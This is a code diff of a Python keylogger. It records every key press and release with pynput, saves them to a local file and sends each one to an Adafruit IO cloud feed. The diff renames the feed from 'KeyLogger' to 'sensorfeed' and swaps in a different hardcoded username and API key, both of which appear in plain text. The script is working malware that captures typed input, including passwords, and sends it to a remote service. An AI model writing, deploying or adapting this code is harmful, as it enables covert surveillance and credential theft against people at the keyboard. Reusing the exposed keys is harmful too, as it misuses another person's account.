@@ -1,22 +1,17 @@
 from pynput import keyboard
 
-
 from Adafruit_IO import Client, Feed, RequestError
 
 import calendar
 import time
 
-ADAFRUIT_IO_USERNAME = 'addams81'
-ADAFRUIT_IO_KEY = 'aio_QSXe69WpRd5KuLgycMuGsXWa2zTT'
+ADAFRUIT_IO_USERNAME = 'Paces53'
+ADAFRUIT_IO_KEY = 'aio_nqoI77kQJQHwz74qcy5vhBwm0zOV'
 
 # Create an instance of the REST client.
 aio = Client(ADAFRUIT_IO_USERNAME, ADAFRUIT_IO_KEY)
 
-try: # if we have a 'digital' feed
-    digital = aio.feeds('KeyLogger')
-except RequestError: # create a digital feed
-    feed = Feed(name="KeyLogger")
-    digital = aio.create_feed(feed)
+adafeed = aio.feeds('sensorfeed')
 
 
 # detect keypress
@@ -27,13 +22,13 @@ def on_press(key):
         ts = calendar.timegm(time.gmtime())
         upper = str(key.char).upper()
         f.write(str(ts) + ':' + 'KeyPressed' + ':' + upper + '\n')
-        aio.send(digital.key,upper)
+        aio.send(adafeed.key, upper)
     except:
         print('special key {0} pressed'.format(key))
         ts = calendar.timegm(time.gmtime())
         upper = str(key).upper()
         f.write(str(ts) + ':' + 'KeyPressed' + ':' + upper + '\n')
-        aio.send(digital.key,upper)
+        aio.send(adafeed.key, upper)
     f.close()
 
 
@@ -44,7 +39,7 @@ def on_release(key):
     print('{0} released'.format(key))
     upper = str(key).upper()
     f.write(str(ts) + ':' + 'KeyRealease' + ':' + upper + '\n')
-    aio.send(digital.key, upper)
+    aio.send(adafeed.key, upper)
     if key == keyboard.Key.esc:
         # Stop Listener
         print('Stop')
